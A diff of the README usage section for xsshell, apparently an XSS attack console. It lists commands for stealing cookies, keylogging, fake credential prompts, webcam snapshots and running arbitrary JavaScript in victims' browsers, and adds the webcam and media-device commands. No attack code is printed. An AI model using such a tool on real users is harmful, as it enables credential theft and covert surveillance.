@@ -77,52 +77,67 @@ Usage of xsshell:
 
 Starting the shell console:
 ```
-xsshell
+xsshell 
 listening for sockets on :8234, at url path: /s
 starting console
-xsshell >   
+type \? to list available commands
+xsshell > 
 xsshell > \?
 xsshell > \? \h \help: list available commands
 xsshell > \alert:      send an alert message to the target set
-xsshell > 	usage: \alert ALERT_MESSAGE
+xsshell >              usage: \alert ALERT_MESSAGE
 xsshell > \cs:         get the current cookies from the target set's current page and any cookie updates.
+xsshell > \emd:        return a list of media devices accessible to the target set's browser
 xsshell > \ex:         print out the client exploit javascript
 xsshell > \exm:        print out the minified version of the client exploit javascript
-xsshell > \gi:         download all images on the target set's page. images will be stored in DOWNLOAD_DIR. relative file paths are relative to the path provided to -wrkdir
-xsshell > 	usage: \gi [DOWNLOAD_DIR]
-xsshell > 	examples:
-xsshell > 		\gi
-xsshell > 		\gi /tmp/images
-xsshell > 		\gi imgdir
+xsshell > \gi:         download all images on the target set's page. 
+xsshell >              images will be stored in DOWNLOAD_DIR. 
+xsshell >              relative file paths are relative to the path provided to -wrkdir
+xsshell >              usage: \gi [DOWNLOAD_DIR]
+xsshell >                  examples:
+xsshell >                      \gi
+xsshell >                      \gi /tmp/images
+xsshell >                      \gi imgdir
 xsshell > \kl:         start a keylogger on the target set
 xsshell > \ll:         list out any links found on the target set's currently open page
 xsshell > \pfl:        open a modal on the target set's page prompting them for a username and password
 xsshell > \ps:         print out socket info for all actively connected websockets
 xsshell > \q:          exit this program
-xsshell > \sf:         send a javascript file to the target set and execute it. any data can be returned from the target set by calling `this.send("return data string");` in the script. relative file paths are relative to the path provided to -wrkdir
-xsshell > 	usage: \sf FILE_PATH
+xsshell > \sf:         send a javascript file to the target set and execute it. 
+xsshell >              any data can be returned from the target set by calling `this.send(\"return data string\");` in the script. 
+xsshell >              relative file paths are relative to the path provided to -wrkdir
+xsshell >              usage: \sf FILE_PATH
 xsshell > \sfl:        resend the last file that was sent using \sf, includes any new changes to the file
 xsshell > \src:        get the target set's currently rendered page source
 xsshell > \st:         set the websockets to target. one or more targets can be set with the following methods:
-xsshell > 	*        -targets all active websocket connections (default target set)
-xsshell > 	8        -target a single websocket connection belonging to that id number
-xsshell > 	1,2,8,10 -targets all websocket IDs in the comma separated list
-xsshell > 	4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
-xsshell > 	4-       -targets all websocket IDs that are greater than or equal to the listed number
-xsshell > 	-16      -targets all websocket IDs that are less than or equal to the listed number
-xsshell > 	usage: \st TARGET_SET
-xsshell > 	examples:
-xsshell > 		\st *
-xsshell > 		\st 2
-xsshell > 		\st 2,4,7
-xsshell > 		\st 10-15
-xsshell > 		\st 6-
-xsshell > 		\st -100
+xsshell >              *        -targets all active websocket connections (default target set)
+xsshell >              8        -target a single websocket connection belonging to that id number
+xsshell >              1,2,8,10 -targets all websocket IDs in the comma separated list
+xsshell >              4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
+xsshell >              4-       -targets all websocket IDs that are greater than or equal to the listed number
+xsshell >              -16      -targets all websocket IDs that are less than or equal to the listed number
+xsshell >              usage: \st TARGET_SET
+xsshell >                  examples:
+xsshell >                      \st *
+xsshell >                      \st 2
+xsshell >                      \st 2,4,7
+xsshell >                      \st 10-15
+xsshell >                      \st 6-
+xsshell >                      \st -100
+xsshell > \wcs:        attempt to take a snapshot from the target set's webcam, if one is available. 
+xsshell >              images will be stored in DOWNLOAD_DIR. 
+xsshell >              relative file paths are relative to the path provided to -wrkdir.
+xsshell >              NOTE: using this command may prompt the target set for webcam access. 
+xsshell >              the target set may reject the prompt, or ignore it entirely.
+xsshell >              usage: \ws DOWNLOAD_DIR
+xsshell >                  examples:
+xsshell >                      \wcs /tmp/webcam_snaps
+xsshell >                      \wcs snaps
 xsshell > \xhr:        send an xhr request from the target set's current page
-xsshell > 	usage: \xhr HTTP_METHOD FULL_URL [CONTENT_HEADER] [POST_BODY]
-xsshell > 	examples:
-xsshell > 		\xhr GET https://google.com/
-xsshell > 		\xhr POST https://google.com/ application/json {"hello": "world"}
-xsshell >
+xsshell >              usage: \xhr HTTP_METHOD FULL_URL [CONTENT_HEADER] [POST_BODY]
+xsshell >                  examples:
+xsshell >                      \xhr GET https://google.com/
+xsshell >                      \xhr POST https://google.com/ application/json {"hello": "world"}
+xsshell > 
 ```
 
